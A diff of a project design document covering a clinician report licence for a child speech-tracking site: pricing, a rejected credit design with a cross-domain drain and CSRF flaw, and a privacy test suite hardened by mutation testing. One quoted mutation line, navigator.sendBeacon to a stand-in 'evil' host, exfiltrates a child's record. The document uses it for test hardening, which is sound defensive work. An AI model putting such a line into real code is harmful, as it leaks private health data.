@@ -170,7 +170,9 @@ a server.
 
 ## What is actually sold, and what is not
 
-**Live:** `/clinician` · **Tests:** `npm run test:billing` (16)
+**Status: built and merged, NOT yet deployed.** `kide.us/clinician` is still
+serving the free-only page; `/api/health` will list `portfolioBilling` once this
+ships. **Tests:** `npm run test:billing` (24).
 
 Every measurement is free, permanently. A parent hands over a link and a
 clinician reads every number in it without paying, without an account, and
@@ -186,32 +188,68 @@ is the gap between a page a clinician can read and a document a clinician can
 file, and it is worth money precisely because documentation time is the scarcest
 thing an SLP has.
 
-**One credit, one report. $39 for five, $129 for twenty-five.** The unit is a
-caseload, not a document: one clinician carries about forty families, so a
-per-child price is absurd and a per-seat subscription is a procurement
-conversation nobody has agreed to have. At $7.80 a report it repays itself
-against a billable hour if it saves fifteen minutes. Every full SLP practice-
-management tool starts at $39–49 *per month*, most at $150–200 per provider, so
-this sits below the threshold where anyone has to ask permission to try it.
+**$39 once, unlimited reports, no subscription and no account.** Every full SLP
+practice-management tool starts at $39–49 *per month*, most at $150–200 per
+provider, so this sits below the level at which anyone has to ask permission to
+try it. It is deliberately generous, because the open question here is not "how
+much" but "will an SLP pay at all", and metering a product nobody has bought yet
+optimises the wrong variable. If clinicians buy, the next step is a
+subscription, not a smaller pack.
+
+### Why not metered credits — the design that was tried and rejected
+
+The first version sold packs of report credits and spent one per unlock. It was
+green, tested, and wrong twice over:
+
+1. **Portfolio credits are one fungible balance per person, not a per-domain
+   one.** riskfreetrial's `fetchLedgerBalance` keys on `global_user_id` alone;
+   `domain` is written to the ledger row but never scopes the debit. trycrm.co
+   sells 100 of the same credits for $9. So "$7.80 a report" was fiction — a
+   clinician could buy 100 reports for $9 through another leaf — and, far worse,
+   a spend call on kide.us could drain credits somebody bought somewhere else.
+2. **There is no session on this domain, by design.** A spend endpoint
+   authorised by nothing but an emailed-in address is a remote unauthenticated
+   drain of the shared portfolio balance, and CSRF-able besides, since
+   `request.json()` ignores Content-Type.
+
+Both were found by adversarial review, not by the test suite that was written to
+prevent exactly this. Entitlement is now read-only: *has this address bought the
+kide.us licence?* Nothing kide does can decrease anybody's balance, so there is
+nothing left to steal.
 
 ### The paywall is deliberately the weak kind
 
-Entitlement is checked on the server; the document is rendered in the page.
+The licence is checked on the server; the document is rendered in the page.
 Server-rendering it would be marginally harder to bypass and would require
 posting a child's phoneme history to a server — the one promise this product
 cannot break. So this is a professional licence enforced by an entitlement
-check, not DRM. Anyone who reads the page source can render the document
-unpaid; a licensed clinician putting a document in a patient chart is not that
-person, and designing for that person would cost the privacy guarantee that is
-the only reason this record can exist.
+check, not DRM. Anyone who opens devtools can set the flag; a licensed clinician
+putting a document in a patient chart is not that person, and designing for that
+person would cost the privacy guarantee that is the only reason this record can
+exist.
 
-Three things reach the network, and they are exhaustive: the clinician's own
-email, an opaque random token this browser generated, and an offering id. No
-phoneme, no count, no date, no name, nothing derived from any of them.
-`test-billing.mjs` asserts it, and asserts it against the request shape rather
-than the transport — the first version matched on `fetch(` and was therefore
-vacuous, which mutation-testing found by leaking `record.targets` past a green
-suite.
+Two things reach the network, and they are exhaustive: the clinician's own email
+and an offering id. No phoneme, no count, no date, no name, nothing derived from
+any of them. The checkout return URL cannot carry `?data=` either — a test
+asserts that specifically, because "keep the report open after payment" is the
+most plausible-looking way anyone will ever break this.
+
+### The test suite was twice worthless before it was useful
+
+Worth stating plainly, because both mistakes look like diligence:
+
+- **v1 matched request bodies on `fetch(`.** The page dispatches through a
+  one-line `api()` wrapper, so every body was invisible. A deliberate leak of
+  `record.targets` passed 15/15.
+- **v2 allow-listed fields inside the two request shapes it knew about.** A
+  reviewer added `navigator.sendBeacon('https://evil/', record)` and it stayed
+  16/16 green.
+
+An allow-list over recognised call shapes tests the shapes, not the boundary.
+The suite now denies every transport it does not expect to exist, asserts it can
+still see the calls it polices, and is checked by mutation — eight deliberate
+breakages, all caught, including one (`?data=` XSS) that had previously passed
+because the assertion grepped the source instead of executing it.
 
 ## What is still required
 
